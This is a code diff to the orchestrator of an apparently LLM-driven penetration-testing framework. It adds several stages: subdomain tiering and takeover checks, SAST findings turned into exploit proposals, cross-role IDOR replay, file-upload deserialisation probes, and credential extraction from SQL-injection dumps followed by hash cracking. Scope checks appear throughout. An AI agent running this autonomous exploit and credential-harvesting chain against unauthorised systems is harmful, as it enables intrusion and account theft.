@@ -362,6 +362,45 @@ class CentralBrain(
         self._write_live_results()
 
     def _transition_to_next_phase(self):
+        # P2-2: emit hypothesis-engine summary at every transition so we
+        # can see whether the LLM's next-best-action is being pursued.
+        try:
+            from core.hypothesis.hypothesis_engine import get_engine
+            eng = get_engine()
+            summary = eng.summary()
+            if summary:
+                logger.info(f"HYPOTHESIS_SUMMARY: {summary}")
+            nba = eng.next_best_action()
+            if nba:
+                logger.info(f"HYPOTHESIS_NBA: vuln_class={nba.vuln_class} "
+                            f"endpoint={nba.endpoint} score={nba.score():.2f}")
+        except Exception as _e:
+            logger.debug(f"hypothesis summary skipped: {_e}")
+
+        # P0-4: prefer the dependency-aware scheduler when we have enough
+        # context. Fall back to the legacy state-machine only if the DAG
+        # can't produce a next phase (typically because prereqs aren't met
+        # yet — in that case we terminate the loop, same as before).
+        try:
+            from core.orchestration.phase_dag import PhaseScheduler, default_dag
+            completed = {p.value for p in getattr(self, "phase_history", []) or []
+                         if hasattr(p, "value")}
+            if getattr(self, "current_phase", None):
+                completed.add(self.current_phase.value)
+            allowed = set(self._allowed_phases) if self._allowed_phases else None
+            sched = PhaseScheduler(default_dag(), allowed=allowed)
+            nxt = sched.next_ready(self.ctx, completed)
+            if nxt:
+                self.transition_phase(ExecutionPhase(nxt))
+                return
+            reasons = sched.blocked_reasons(self.ctx, completed)
+            if reasons:
+                logger.info(f"PHASE_DAG_BLOCKED: {reasons}")
+            self.current_phase = None
+            return
+        except Exception as _e:
+            logger.debug(f"PhaseScheduler fell back to legacy transition: {_e}")
+
         next_phase = self._evaluate_phase_transition()
         if next_phase:
             if self._allowed_phases and next_phase.value not in self._allowed_phases:
@@ -463,11 +502,22 @@ class CentralBrain(
         self.target = target
         self.scope = scope or {}
         
-        # Initialize target scope validation
+        # Initialize target scope validation and wire the unified façade so
+        # every executor consults the same authority. This closes the "three
+        # disjoint singletons" gap (#082/#083).
         from core.security.authorization import TargetScopeValidator
+        from core.security.scope_facade import get_scope_authority
         auth_targets = self.scope.get("domains") or self.scope.get("authorized_targets") or [target]
-        TargetScopeValidator.set(TargetScopeValidator(auth_targets))
-        
+        tsv = TargetScopeValidator(auth_targets)
+        TargetScopeValidator.set(tsv)
+
+        _authority = get_scope_authority()
+        _authority.wire_target_scope_validator(tsv)
+        # Seed the façade's own allowlist so it can enforce even before the
+        # ScopeManager / LegalValidator are wired.
+        for _t in auth_targets:
+            _authority.add_domain(_t)
+
         self.authorized_scope = auth_targets
         self.execution_count = 0
         self.max_iterations = 100
@@ -1485,6 +1535,29 @@ class CentralBrain(
         logger.info("\nValidating tools...")
         await self.tools.validate_tools()
 
+        # P1-7: probe critical tools with the ToolHealthManager so broken
+        # binaries are marked COOLDOWN/UNAVAILABLE up-front. Then callers
+        # skip them and pick replacements instead of the LLM burning a
+        # round on a known-dead tool.
+        try:
+            from core.tools.tool_health import get_health_manager
+            hm = get_health_manager()
+            for _tool in ("ffuf", "feroxbuster", "gobuster", "dirsearch",
+                          "nmap", "masscan", "subfinder", "assetfinder",
+                          "amass", "nuclei", "nikto", "sqlmap", "httpx",
+                          "whatweb", "wafw00f", "katana"):
+                try:
+                    hm.probe(_tool)
+                except Exception:
+                    pass
+            snap = hm.snapshot()
+            unavail = [t for t, s in snap.items()
+                       if s.get("state") in ("UNAVAILABLE", "COOLDOWN")]
+            if unavail:
+                logger.warning(f"TOOL_HEALTH_UNAVAILABLE: {unavail}")
+        except Exception as _e:
+            logger.debug(f"[ToolHealth] startup probe skipped: {_e}")
+
         # HexStrike Intelligence: Profile target
         logger.info("\n>>> TARGET INTELLIGENCE: Profiling target...")
         try:
@@ -1498,6 +1571,18 @@ class CentralBrain(
             from contextlib import asynccontextmanager
         except ImportError:
             pass
+
+        # Warm-start from prior scan intel — endpoints / subdomains / techs /
+        # working login recipes we already learned. Then IMMEDIATELY verify
+        # the primed data isn't stale: fingerprint check on the base URL +
+        # liveness sweep on primed endpoints. Drops anything the target has
+        # removed and forces full re-discovery if the app was replaced.
+        try:
+            from core.intel.target_memory import prime_ctx, verify_and_refresh
+            prime_ctx(self.ctx, self.ctx.target)
+            await verify_and_refresh(self.ctx, self.ctx.target)
+        except Exception as _e:
+            logger.debug(f"[TargetMemory] prime/verify failed: {_e}")
 
         self._write_progress({"phase": self.current_phase.value if self.current_phase else None, "status": "starting"})
 
@@ -1540,6 +1625,40 @@ class CentralBrain(
                     break
 
         self._clean_stop_signal()
+        # Persist learned intel so the next scan of this target starts warm.
+        try:
+            from core.intel.target_memory import record_scan_intel
+            record_scan_intel(self.ctx.target, self.ctx, self._scan_id)
+        except Exception as _e:
+            logger.debug(f"[TargetMemory] record failed: {_e}")
+        # Generate reproducibility bundles for every HIGH/CRITICAL finding.
+        try:
+            from core.reporting.repro_bundle import generate_bundles_for_scan
+            generate_bundles_for_scan(self._scan_id, min_severity="HIGH")
+        except Exception as _e:
+            logger.debug(f"[ReproBundle] generation failed: {_e}")
+        # Phase 2.1: clear the inter-agent scratchpad for this scan so its
+        # rows don't accumulate. The scratchpad is scoped per-scan so this
+        # is the right point to wipe it.
+        try:
+            from core.orchestration.agent_scratchpad import get_scratchpad
+            n = get_scratchpad(self._scan_id, "cleaner").clear_scan()
+            if n:
+                logger.info(f"[Scratchpad] purged {n} entries for {self._scan_id}")
+        except Exception as _e:
+            logger.debug(f"[Scratchpad] cleanup skipped: {_e}")
+        # P3-4: emit scan efficiency metrics for the report builder.
+        try:
+            from core.observability.scan_metrics import get_metrics
+            snap = get_metrics().snapshot()
+            logger.info(f"SCAN_METRICS: {snap}")
+            try:
+                self.ctx.update("scan_metrics", snap)
+            except Exception:
+                pass
+        except Exception as _e:
+            logger.debug(f"scan metrics emit skipped: {_e}")
+
         self._write_progress({"status": "stopped" if stopped else "completed"})
         duration = (datetime.now() - self.start_time).total_seconds()
         if stopped:
@@ -1596,6 +1715,31 @@ class CentralBrain(
                 await self._run_phase("OSINT_RECONNAISSANCE")
             await self._run_phase("DEEP_RECONNAISSANCE")
             await self._persist_recon_findings()
+            # Phase 1.1 + 1.2: after RECON completes, extract routes/endpoints
+            # from the app's JS bundles (webpack + sourcemap) and observe DOM
+            # sinks via headless Chrome. Both are non-fatal; missing tools =>
+            # skip and log. Adds to ctx.endpoints so downstream SCAN/EXPLOIT
+            # phases see the app's real attack surface, not just the URLs
+            # katana/ffuf crawled statically.
+            try:
+                await self._run_bundle_and_dom_analysis()
+            except Exception as e:
+                logger.warning(f"[BundleDOM] analysis failed (non-fatal): {e}")
+            # Phase 3.1 + 3.2 + 3.3 + 3.4 + 3.5: SAST unlock. If an exposed
+            # .git/config or sourcemap was found in RECON, clone/rehydrate
+            # the source, run semgrep (and codeql if installed), and feed
+            # each finding through the LLM code-reviewer for exploit design.
+            try:
+                await self._run_sast_pipeline()
+            except Exception as e:
+                logger.warning(f"[SAST] pipeline failed (non-fatal): {e}")
+            # Phase 5: retrieve framework-specific attack quirks now that the
+            # tech-stack fingerprint is known — they'll be surfaced to the
+            # exploit planner as prioritised primitives.
+            try:
+                await self._prime_framework_corpus()
+            except Exception as e:
+                logger.warning(f"[FrameworkCorpus] priming failed (non-fatal): {e}")
             await self._classify_subdomains()          # label every subdomain live/dead
             await self._scan_subdomain_endpoints()
             await self._capture_requests()
@@ -1933,6 +2077,31 @@ class CentralBrain(
             except Exception as e:
                 logger.warning(f"[FuzzerOrchestrator] Fuzzing failed (non-fatal): {e}")
 
+            # ── AUTHZ phase (Phase 1.3): cross-role replay of every captured
+            # authenticated request under every discovered identity. Finds
+            # BOLA / IDOR / vertical privilege escalation that per-endpoint
+            # nuclei/nikto/dalfox never sees because they don't know about
+            # role sessions. Non-fatal — logs and skips if no identities or
+            # no captured requests are on the ctx yet.
+            try:
+                await self._run_authz_phase()
+            except Exception as e:
+                logger.warning(f"[AUTHZ] cross-role replay failed (non-fatal): {e}")
+
+            # ── Semantic fuzzer + coverage-guided loop (Phase 1.4 + 4.1) ──
+            try:
+                await self._run_semantic_fuzz_with_coverage()
+            except Exception as e:
+                logger.warning(f"[SemanticFuzz] failed (non-fatal): {e}")
+
+            # ── File-format probes (Phase 2.2): try HDF5 / fsspec / YAML /
+            # pickle / parquet attacks against any endpoint that accepts
+            # file uploads. Non-fatal.
+            try:
+                await self._run_format_probes()
+            except Exception as e:
+                logger.warning(f"[FormatProbes] failed (non-fatal): {e}")
+
             chain_plan = None
             if self.ctx.vulnerabilities:
                 self.chain_mgr.build_graph()
@@ -2050,6 +2219,20 @@ class CentralBrain(
             except Exception as _e:
                 logger.warning(f"[SQLiDump] escalation failed (non-fatal): {_e}")
 
+            # Structured cred extraction: any finding whose details/evidence
+            # contains "email : hash|password" rows (e.g. the LLM's UNION-dump
+            # proof text) gets its plaintext parsed into leaked_credentials +
+            # post_exploit_data + auth_bypasses. This closes the gap where the
+            # LLM captured admin@juice-sh.op:0192... in a finding's evidence
+            # but nothing structured it for the credential-chain.
+            try:
+                from core.exploitation.dump_extractor import extract_from_all_findings
+                extract_from_all_findings(self._scan_id,
+                                           getattr(self.ctx, "vulnerabilities", []) or [],
+                                           ctx=self.ctx)
+            except Exception as _e:
+                logger.warning(f"[DumpExtractor] failed (non-fatal): {_e}")
+
             # Hash cracking: for every harvested password hash try the top-10k
             # wordlist (Python md5/sha1/sha256 + hashcat fallback for bcrypt).
             # Cracked plaintexts flow into harvested_creds → CredChain.
@@ -2133,10 +2316,49 @@ class CentralBrain(
                 except Exception as e:
                     logger.warning(f"[CredChain] Authenticated sweep failed (non-fatal): {e}")
 
-            # Expert-mode probes: JWT kid, prototype pollution, HTTP smuggling
-            # sweep across all hosts, SSRF metadata, timing user-enum, captcha
-            # bypass + brute. These plug coverage gaps a professional pentester
-            # would always cover but the default scanners skip.
+            # === Advanced generic modules (target-agnostic) ===
+            # 1) JS bundle analyzer — extract hidden SPA routes and feed them
+            #    into ctx.endpoints so every downstream module sees them.
+            try:
+                from core.exploitation.js_bundle_analyzer import analyze_bundles
+                base = self.ctx.target if str(self.ctx.target).startswith(("http://","https://")) else f"https://{self.ctx.target}"
+                await analyze_bundles(self.ctx, base)
+            except Exception as _e:
+                logger.warning(f"[JSBundleAnalyzer] failed (non-fatal): {_e}")
+
+            # 2) Cross-role replay (BOLA/IDOR) — requires AutoLogin to have
+            #    populated multiple sessions.
+            try:
+                from core.exploitation.cross_role_replay import run_cross_role_replay
+                await run_cross_role_replay(self.ctx)
+            except Exception as _e:
+                logger.warning(f"[CrossRoleReplay] failed (non-fatal): {_e}")
+
+            # 3) Semantic API fuzzer — business-logic abuse on every JSON POST.
+            try:
+                from core.exploitation.semantic_api_fuzzer import run_semantic_fuzz
+                await run_semantic_fuzz(self.ctx)
+            except Exception as _e:
+                logger.warning(f"[SemanticFuzzer] failed (non-fatal): {_e}")
+
+            # 4) Headless-browser DOM sink monitor — client-side XSS via
+            #    Playwright hooks on document.write/eval/innerHTML/etc.
+            try:
+                from core.exploitation.dom_sink_monitor import run_dom_sink_monitor
+                base = self.ctx.target if str(self.ctx.target).startswith(("http://","https://")) else f"https://{self.ctx.target}"
+                await run_dom_sink_monitor(self.ctx, base)
+            except Exception as _e:
+                logger.warning(f"[DOMSinkMonitor] failed (non-fatal): {_e}")
+
+            # 5) GraphQL + WebSocket generic discovery and abuse.
+            try:
+                from core.exploitation.graphql_ws_probe import run_graphql_and_ws
+                await run_graphql_and_ws(self.ctx)
+            except Exception as _e:
+                logger.warning(f"[GraphQLWSProbe] failed (non-fatal): {_e}")
+
+            # Existing expert-mode probes: JWT kid, prototype pollution, HTTP
+            # smuggling sweep, SSRF metadata, timing user-enum, captcha bypass.
             try:
                 from core.exploitation.expert_probes import run_all_expert_probes
                 exp_findings = await run_all_expert_probes(self.ctx)
@@ -2971,6 +3193,71 @@ class CentralBrain(
         if self.ctx.subdomains:
             context_hint += f"Known subdomains: {', '.join(self.ctx.subdomains[:20])}\n\n"
 
+        # P1-6: hand the LLM a normalized state summary instead of relying
+        # on raw history. Bounded to <60 lines so it stays cheap. P1-4:
+        # target-specific prioritized plan replaces the generic checklist.
+        try:
+            from core.knowledge.state_summary import build_state, render
+            from core.adaptation.waf_state import get_waf_state
+            from core.orchestration.target_plan import build_plan, render_plan, TargetSummary
+            from core.intelligence.asset_classifier import AssetClass
+            waf_mode = get_waf_state().mode_for(self.ctx.target).value
+            state = build_state(
+                self.ctx, waf_mode=waf_mode,
+                observations=[v.get("title", "") for v in self.ctx.vulnerabilities[:20]],
+                hypotheses={"open": [], "rejected": []},
+                tools_executed=list(getattr(self.ctx, "tools_executed", []) or [])[:30],
+                missing_evidence=[],
+            )
+            context_hint += "\n[NORMALIZED STATE]\n" + render(state) + "\n"
+            asset_classes = getattr(self.ctx, "asset_classes", {}) or {}
+            ac = "LIVE_APP"
+            for _, cls in asset_classes.items():
+                if cls == AssetClass.LIVE_APP.value:
+                    ac = cls
+                    break
+            summary = TargetSummary(
+                target=self.ctx.target, asset_class=ac,
+                technologies=list(getattr(self.ctx, "technologies", []) or [])[:15],
+                endpoints=list(getattr(self.ctx, "endpoints", []) or [])[:30],
+                parameters=list(getattr(self.ctx, "parameters", []) or [])[:20],
+                auth_state="authenticated" if getattr(self.ctx, "auth_session", None) else "anonymous",
+                api_bases=[e for e in (getattr(self.ctx, "endpoints", []) or [])
+                           if isinstance(e, str) and "/api" in e][:10],
+            )
+            plan = build_plan(summary)
+            if plan:
+                context_hint += "\n[TARGET-SPECIFIC PLAN]\n" + render_plan(plan) + "\n"
+                # P2-2: seed the hypothesis engine with the plan items so
+                # `next_best_action` can guide subsequent decisions.
+                try:
+                    from core.hypothesis.hypothesis_engine import get_engine, Hypothesis, HypothesisState
+                    from core.observability.scan_metrics import get_metrics
+                    eng = get_engine()
+                    existing = {(h.vuln_class, h.endpoint) for h in eng.open_hypotheses()}
+                    added = 0
+                    for item in plan:
+                        for tgt in (item.targets or [self.ctx.target])[:5]:
+                            key = (item.vuln_class, tgt)
+                            if key in existing:
+                                continue
+                            eng.add(Hypothesis(
+                                vuln_class=item.vuln_class, target=self.ctx.target,
+                                endpoint=tgt, rationale=item.rationale,
+                                required_evidence=["tool_confirmation"],
+                                priority={"P1": 0.9, "P2": 0.7, "P3": 0.5, "P4": 0.3}.get(item.priority, 0.5),
+                                cost_estimate={"P1": 0.7, "P2": 1.0, "P3": 1.2, "P4": 2.0}.get(item.priority, 1.0),
+                                state=HypothesisState.OPEN,
+                            ))
+                            added += 1
+                    if added:
+                        get_metrics().inc("hypotheses_generated", by=added)
+                        logger.info(f"HYPOTHESIS_SEEDED: added={added}")
+                except Exception:
+                    pass
+        except Exception as _e:
+            logger.debug(f"normalized-state context skipped: {_e}")
+
         if phase in ("exploit", "EXPLOITATION"):
             failed_exploits = sum(1 for e in self.ctx.exploit_results if not e.get("success"))
             total_exploits = len(self.ctx.exploit_results)
@@ -3065,10 +3352,18 @@ class CentralBrain(
         except Exception:
             pass
 
-        # If agentic execution produced nothing useful (LLM down, connection errors),
-        # raise to trigger approach A fallback with deterministic tasks
-        if result.steps_taken == 0 and len(result.findings) == 0:
-            raise RuntimeError(f"Agentic executor produced no results for {phase} (LLM likely unreachable)")
+        # If agentic execution produced nothing at all (no steps AND no LLM
+        # errors AND no findings), the LLM is likely unreachable — raise to
+        # trigger the deterministic fallback. Previously "steps=0 & findings=0"
+        # ALONE was enough, which over-triggered when the LLM correctly
+        # concluded there was nothing exploitable in this phase.
+        no_llm_calls = getattr(result, "llm_calls", 0) == 0
+        had_llm_errors = bool(getattr(result, "llm_errors", 0))
+        if result.steps_taken == 0 and len(result.findings) == 0 and (no_llm_calls or had_llm_errors):
+            raise RuntimeError(
+                f"Agentic executor produced no results for {phase} "
+                f"(llm_calls={getattr(result, 'llm_calls', '?')}, "
+                f"llm_errors={getattr(result, 'llm_errors', '?')}) — falling back")
 
     def _deterministic_fallback(self, phase: str, executed_caps: set = None):
         """Return a BrainDecision with default tasks when the LLM planner fails.
@@ -4761,11 +5056,20 @@ class CentralBrain(
         return recovered
 
     async def _probe_live_subdomains(self, urls: list) -> list:
-        """
-        Concurrently probe subdomain URLs and return only the LIVE, in-scope ones,
-        ranked so real application instances (larger HTML/JSON bodies, non-redirect
-        200s) are tested first. Dead hosts and off-scope redirects are dropped so the
-        scan budget is spent on instances that actually respond.
+        """Probe every subdomain URL and tier it:
+
+          tier=LIVE      — 2xx/3xx with substantive content on an in-scope host.
+                           Gets the full deep-scan treatment (60 rounds).
+          tier=DEAD      — 5xx / timeout / DNS-fail. Gets 3 rounds of takeover-
+                           only checks. Not worth a full scan against a stock
+                           error page.
+          tier=EXTERNAL  — redirects to an OUT-of-scope host (e.g. leanpub.com,
+                           github.io marketing pages). Dropped entirely — a
+                           full scan would be an unauthorised interaction with
+                           a third party.
+
+        Returned list is sorted best-first so the parallel scan schedule spends
+        its LLM budget on the hosts with the largest attack surface.
         """
         import httpx
         from urllib.parse import urlparse
@@ -4779,23 +5083,65 @@ class CentralBrain(
                     async with httpx.AsyncClient(verify=False, timeout=10, follow_redirects=True) as c:
                         r = await c.get(scheme_url, headers={"User-Agent": "Mozilla/5.0"})
                         final_host = urlparse(str(r.url)).hostname or host
-                        # Only keep instances that still resolve within authorized scope.
+                        # Redirects that leave authorised scope are marked
+                        # EXTERNAL, not LIVE — we must not scan them.
                         if not scope.is_authorized(final_host):
-                            return None
+                            return {"url": scheme_url, "host": host,
+                                    "status": r.status_code,
+                                    "final_host": final_host,
+                                    "tier": "EXTERNAL",
+                                    "score": -1,
+                                    "note": f"redirects to out-of-scope host {final_host}"}
                         body_len = len(r.content or b"")
-                        # score: prefer 200s with substantial app content
+                        # A 5xx (Heroku sleeping dyno, S3 500, etc.) is DEAD
+                        # for full-scan purposes — takeover-only check is worth
+                        # doing but nuclei/sqlmap/dalfox against an error page
+                        # is pure noise.
+                        if r.status_code >= 500:
+                            return {"url": scheme_url, "host": host,
+                                    "status": r.status_code,
+                                    "final_host": final_host,
+                                    "tier": "DEAD", "len": body_len,
+                                    "score": 0,
+                                    "note": f"HTTP {r.status_code} on first hit"}
+                        # LIVE: prefer 200s with substantial app content.
                         score = body_len + (5000 if r.status_code == 200 else 0)
-                        return {"url": scheme_url, "host": host, "status": r.status_code,
-                                "len": body_len, "score": score}
+                        return {"url": scheme_url, "host": host,
+                                "status": r.status_code,
+                                "final_host": final_host,
+                                "tier": "LIVE", "len": body_len,
+                                "score": score}
                 except Exception:
                     continue
-            return None
+            # No response on either scheme → DEAD (DNS-fail / timeout).
+            return {"url": url, "host": host, "status": 0,
+                    "tier": "DEAD", "len": 0, "score": 0,
+                    "note": "no response on https/http"}
 
         results = await asyncio.gather(*(_probe(u) for u in urls), return_exceptions=True)
-        live = [r for r in results if isinstance(r, dict) and r]
-        live.sort(key=lambda x: x["score"], reverse=True)
-        logger.info(f"[SubdomainScan] Liveness: {len(live)}/{len(urls)} subdomains live "
-                    f"({', '.join(l['host'] for l in live[:10])})")
+        graded = [r for r in results if isinstance(r, dict) and r]
+        graded.sort(key=lambda x: x.get("score", 0), reverse=True)
+        live = [r for r in graded if r.get("tier") == "LIVE"]
+        dead = [r for r in graded if r.get("tier") == "DEAD"]
+        external = [r for r in graded if r.get("tier") == "EXTERNAL"]
+        logger.info(
+            f"[SubdomainScan] Liveness: {len(live)} live, {len(dead)} dead, "
+            f"{len(external)} external-redirect; live=("
+            f"{', '.join(l['host'] for l in live[:10])})"
+        )
+        # Retain the tiers on ctx so the UI / notifications can show them.
+        try:
+            self.ctx.subdomain_tiers = {
+                "live": [r["host"] for r in live],
+                "dead": [r["host"] for r in dead],
+                "external": [r["host"] for r in external],
+            }
+        except Exception:
+            pass
+        # Expose the dead tier so `_scan_subdomain_endpoints` can run a cheap
+        # takeover-only pass instead of skipping them entirely.
+        self._subdomain_dead_tier = dead
+        self._subdomain_external_tier = external
         return live
 
     async def _scan_subdomain_endpoints(self):
@@ -4840,10 +5186,20 @@ class CentralBrain(
             logger.info("[SubdomainScan] No live subdomains to test")
             return
 
-        # Expert mode default: test EVERY live subdomain. Setting MAX_SUBDOMAIN_SCANS=0
-        # (default now) means unlimited; a positive value still caps if the operator
-        # explicitly wants to.
-        cap = _cfg().get_int("MAX_SUBDOMAIN_SCANS", 0)
+        # Per-scan subdomain budget. Two knobs, both bounded so a target with
+        # 50+ subdomains cannot burn the entire LLM budget before SCAN/EXPLOIT.
+        #   MAX_SUBDOMAIN_SCANS    — hard cap on how many LIVE subdomains get
+        #                            the deep 60-round treatment. 0 means "no
+        #                            cap" (previous behaviour) but the default
+        #                            is now 6 so the scan actually progresses
+        #                            past recon on wide targets.
+        #   MAX_DEAD_SUBDOMAIN_CHECKS — how many DEAD hosts get a cheap 3-round
+        #                            takeover-only pass. Default 20 — enough
+        #                            to cover every practical takeover surface
+        #                            without wasting rounds nuclei-scanning
+        #                            stock error pages.
+        cap = _cfg().get_int("MAX_SUBDOMAIN_SCANS", 6)
+        dead_cap = _cfg().get_int("MAX_DEAD_SUBDOMAIN_CHECKS", 20)
         deep = _cfg().get_bool("SUBDOMAIN_DEEP_SCAN", True)
         if cap > 0:
             targets = [l["url"] for l in live[:cap]]
@@ -4853,6 +5209,22 @@ class CentralBrain(
         else:
             targets = [l["url"] for l in live]
             logger.info(f"[SubdomainScan] Expert mode: testing all {len(live)} live subdomains (no cap)")
+
+        # Enqueue DEAD hosts with a 3-round takeover-only objective. The
+        # takeover_detector guards against Heroku sleep-page false positives
+        # so this is cheap AND correct.
+        dead_tier = getattr(self, "_subdomain_dead_tier", []) or []
+        external_tier = getattr(self, "_subdomain_external_tier", []) or []
+        dead_targets: list[str] = []
+        if dead_tier and dead_cap != 0:
+            picks = dead_tier if dead_cap < 0 else dead_tier[:dead_cap]
+            dead_targets = [d["url"] for d in picks]
+            logger.info(f"[SubdomainScan] Queueing {len(dead_targets)} dead subdomain(s) "
+                        f"for takeover-only check (3 rounds each)")
+        if external_tier:
+            logger.info(f"[SubdomainScan] Dropping {len(external_tier)} out-of-scope "
+                        f"redirect(s): {', '.join(e['host'] for e in external_tier[:5])}"
+                        f"{'…' if len(external_tier) > 5 else ''}")
 
         logger.info(f"\n>>> PHASE 1b: LIVE SUBDOMAIN TESTING ({len(targets)} instances, "
                     f"{'comprehensive' if deep else 'recon-only'})")
@@ -4882,11 +5254,36 @@ class CentralBrain(
                 logger.warning("[SubdomainScan] LLM harness unavailable — skipping")
                 return
 
-        for sub_url in targets:
-            sub_host = urlparse(sub_url).hostname
-            logger.info(f"[SubdomainScan] Scanning endpoints on {sub_host}")
+        # Expert mode: fan subdomain scans out in parallel with a bounded
+        # semaphore. Depth per-scan is unchanged (each scan is still exhaustive)
+        # — we just no longer wait for subdomain N-1 to finish before starting N.
+        from core.orchestration.parallel_agents import run_parallel_agents, AgentTracker
+        subdomain_concurrency = _cfg().get_int("SUBDOMAIN_SCAN_CONCURRENCY", 3)
 
-            if deep:
+        async def _scan_one(sub_url: str, tier: str = "LIVE"):
+            sub_host = urlparse(sub_url).hostname
+            logger.info(f"[SubdomainScan] Scanning endpoints on {sub_host} (tier={tier})")
+            if tier == "DEAD":
+                # Dead-tier scan: takeover-only. Full nuclei/sqlmap against a
+                # stock error page produces zero real findings and burns 60
+                # rounds of LLM budget. The takeover_detector already fires
+                # from the AgenticExecutor auto-analyzer on the very first
+                # response, so a 3-round budget is enough to (a) do the DNS
+                # CNAME check, (b) try HTTP if HTTPS 5xx-ed, (c) record the
+                # verdict.
+                objective = (
+                    f"Perform a subdomain-takeover check ONLY on {sub_url}. This host "
+                    f"returned an error on first probe, so a full scan would waste budget. "
+                    f"Steps:\n"
+                    f"1) One HTTP + one HTTPS GET to capture the body.\n"
+                    f"2) dig CNAME {sub_host} — is there a dangling CNAME into "
+                    f".herokuapp.com / .github.io / .s3.amazonaws.com / .azurewebsites.net / .netlify.app?\n"
+                    f"3) Record the verdict via analyze_results. If no CNAME dangles, "
+                    f"there is no takeover — stop.\n"
+                    f"IMPORTANT: Do NOT run nuclei / nikto / sqlmap / dalfox / ffuf here."
+                )
+                rounds = 3
+            elif deep:
                 objective = (
                     f"Comprehensively security-test the live instance {sub_url} "
                     f"(a subdomain of {base_host}, in authorized scope). Treat it as a "
@@ -4901,7 +5298,7 @@ class CentralBrain(
                     "5) Attempt to demonstrate and report each real vulnerability with evidence.\n"
                     f"IMPORTANT: Only interact with {sub_url} — stay in scope."
                 )
-                rounds = 40   # expert mode — don't stop mid-attack
+                rounds = 60   # expert mode — deep drilling, novel attack chaining
             else:
                 objective = (
                     f"Perform endpoint discovery and technology fingerprinting on {sub_url}. "
@@ -4909,7 +5306,7 @@ class CentralBrain(
                     "4) whatweb/httpx fingerprint. 5) Find exposed API/admin/login. "
                     f"IMPORTANT: Only scan {sub_url} — stay in scope."
                 )
-                rounds = 25
+                rounds = 35
 
             try:
                 executor = AgenticExecutor(
@@ -4918,6 +5315,12 @@ class CentralBrain(
                     shared_context=self.ctx,
                     auth_context=auth_context,
                 )
+                # Pre-attach a tracker with the subdomain-specific id so the UI
+                # sees one card per host instead of them all collapsing into
+                # "subdomain_scan_*".
+                executor._tracker = AgentTracker(
+                    self._scan_id, agent_id=f"sub:{sub_host}",
+                    label=sub_host, phase="subdomain_scan", target=sub_url)
                 result = await executor.execute(
                     objective=objective,
                     phase=f"subdomain_scan_{sub_host}",
@@ -4950,11 +5353,262 @@ class CentralBrain(
             except Exception as e:
                 logger.warning(f"[SubdomainScan] {sub_host} scan failed (non-fatal): {e}")
 
-        logger.info(f"[SubdomainScan] Completed testing {len(targets)} live subdomains")
+        await run_parallel_agents(targets, _scan_one,
+                                    concurrency=subdomain_concurrency,
+                                    label="SubdomainScan")
+
+        if dead_targets:
+            # Wrap the tier tag so `run_parallel_agents` still gets a single-arg
+            # callable while `_scan_one` receives tier="DEAD".
+            async def _scan_one_dead(sub_url: str):
+                return await _scan_one(sub_url, tier="DEAD")
+            await run_parallel_agents(dead_targets, _scan_one_dead,
+                                        concurrency=subdomain_concurrency,
+                                        label="SubdomainScan.dead")
+
+        logger.info(f"[SubdomainScan] Completed testing {len(targets)} live subdomains "
+                    f"and {len(dead_targets)} dead-tier takeover checks")
         try:
             self._write_live_results()
         except Exception:
             pass
+
+    async def _run_sast_pipeline(self) -> None:
+        """Phase 3.1-3.5: extract source when available, run semgrep + codeql,
+        run each SAST finding through the LLM code reviewer to design an
+        HTTP-level exploit. All results land on ctx.vulnerabilities via the
+        normal add_vulnerability path so they're deduped, persisted, and
+        rendered in the UI like any other finding."""
+        from core.analysis.source_extractor import (
+            extract_exposed_git, rehydrate_sourcemap, run_semgrep)
+        from core.analysis.codeql_runner import run_codeql, llm_review_finding
+
+        scan_id = getattr(self, "_scan_id", None) or "unscoped"
+        base = getattr(self.ctx, "target", None)
+        if not base:
+            return
+
+        source_trees = []
+        # 3.1 — git leak
+        exposed = any(
+            "/.git/" in str(v.get("location", ""))
+            or "git config" in str(v.get("title", "")).lower()
+            for v in (self.ctx.vulnerabilities or []))
+        if exposed:
+            tree = extract_exposed_git(base, scan_id)
+            if tree:
+                source_trees.append(tree)
+        # 3.2 — sourcemap rehydration for every same-origin bundle
+        try:
+            base_host = str(base).split("/")[2] if "://" in base else base
+        except Exception:
+            base_host = ""
+        for js_url in list(getattr(self.ctx, "js_bundles", []) or [])[:20]:
+            if base_host and base_host not in js_url:
+                continue
+            tree = rehydrate_sourcemap(js_url, scan_id)
+            if tree:
+                source_trees.append(tree)
+
+        if not source_trees:
+            logger.info("[SAST] no source recovered — skipping semgrep/codeql")
+            return
+
+        for tree in source_trees:
+            # 3.3 — semgrep
+            findings = run_semgrep(tree)
+            # 3.4 — codeql (best-effort)
+            try:
+                findings.extend(run_codeql(tree))
+            except Exception as e:
+                logger.debug(f"[SAST] codeql failed: {e}")
+            logger.info(f"[SAST] {tree}: {len(findings)} raw findings")
+            # 3.5 — hand each to the LLM code reviewer, cap so we don't
+            # overspend the LLM budget on a huge tree.
+            for f in findings[:50]:
+                if hasattr(self.ctx, "add_vulnerability"):
+                    self.ctx.add_vulnerability(f)
+                try:
+                    proposal = await llm_review_finding(f, tree)
+                    if proposal:
+                        # Publish the proposed exploit as a note on the
+                        # scratchpad so the ExploitPhase picks it up.
+                        try:
+                            from core.orchestration.agent_scratchpad import get_scratchpad
+                            pad = get_scratchpad(scan_id, "sast-reviewer")
+                            pad.post("tool", proposal, topic="sast_exploit_proposal")
+                        except Exception:
+                            pass
+                except Exception as e:
+                    logger.debug(f"[SAST] LLM review failed for {f.get('rule_id')}: {e}")
+
+    async def _prime_framework_corpus(self) -> None:
+        """Phase 5: retrieve stack-specific quirks and stash them on ctx.
+        The exploit planner reads ctx.framework_quirks for prioritisation."""
+        try:
+            from core.intelligence.framework_corpus import lookup_all
+        except Exception:
+            return
+        fps: list = []
+        # Pull fingerprint strings from wherever RECON stashed them.
+        tp = getattr(self, "target_profile", None)
+        if tp:
+            for attr in ("technologies", "server", "framework", "cms", "waf"):
+                v = getattr(tp, attr, None) or []
+                if isinstance(v, (list, tuple, set)):
+                    fps.extend(str(x) for x in v)
+                elif v:
+                    fps.append(str(v))
+        # Response-header fingerprints (x-powered-by etc.) recorded on ctx.
+        for h in list(getattr(self.ctx, "server_headers", {}) or {}).items():
+            fps.append(f"{h[0]}: {h[1]}")
+        quirks = lookup_all(fps)
+        if quirks:
+            self.ctx.framework_quirks = quirks
+            logger.info(f"[FrameworkCorpus] loaded {len(quirks)} quirk(s) for stacks "
+                        f"in {fps[:5]}")
+        else:
+            logger.info(f"[FrameworkCorpus] no quirks matched fingerprints "
+                        f"({len(fps)} stacks checked)")
+
+    async def _run_bundle_and_dom_analysis(self) -> None:
